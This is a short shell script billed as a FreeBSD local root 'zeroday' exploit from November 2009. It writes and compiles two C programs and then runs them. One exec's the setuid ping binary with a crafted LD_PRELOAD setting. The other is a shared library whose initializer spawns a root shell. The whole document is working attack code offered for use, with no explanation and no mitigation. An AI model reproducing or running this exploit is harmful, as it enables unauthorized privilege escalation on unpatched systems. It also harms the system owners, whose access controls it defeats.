#!/bin/sh
echo ** FreeBSD local r00t zeroday
echo by Kingcope
echo November 2009
cat > env.c << _EOF
#include <stdio.h>

main() {
        extern char **environ;
        environ = (char**)malloc(8096);

        environ[0] = (char*)malloc(1024);
        environ[1] = (char*)malloc(1024);
        strcpy(environ[1], "LD_PRELOAD=/tmp/w00t.so.1.0");

        execl("/sbin/ping", "ping", 0);
}
_EOF
gcc env.c -o env
cat > program.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        extern char **environ;
        environ=NULL;
        system("echo ALEX-ALEX;/bin/sh");
}
_EOF
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,w00t.so.1 -o w00t.so.1.0 program.o -nostartfiles
cp w00t.so.1.0 /tmp/w00t.so.1.0
./env
